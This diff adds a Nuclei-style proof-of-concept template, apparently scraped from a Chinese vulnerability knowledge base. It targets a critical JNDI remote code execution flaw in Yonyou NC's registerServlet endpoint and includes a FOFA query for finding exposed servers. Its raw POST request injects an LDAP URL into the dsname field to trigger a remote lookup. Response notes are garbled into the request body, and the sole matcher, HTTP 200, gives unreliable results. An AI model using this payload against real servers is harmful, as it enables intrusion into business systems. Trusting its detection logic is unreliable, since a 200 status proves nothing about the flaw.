@@ -1,0 +1,51 @@
+id: poc-wne48iz7gpxggx54
+info:
+  name: 用友NC-JNDI远程代码执行-registerServlet
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wne48iz7gpxggx54'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wne48iz7gpxggx54
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/registerServlet HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    type=1&dsname=ldap://www.baidu.com
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
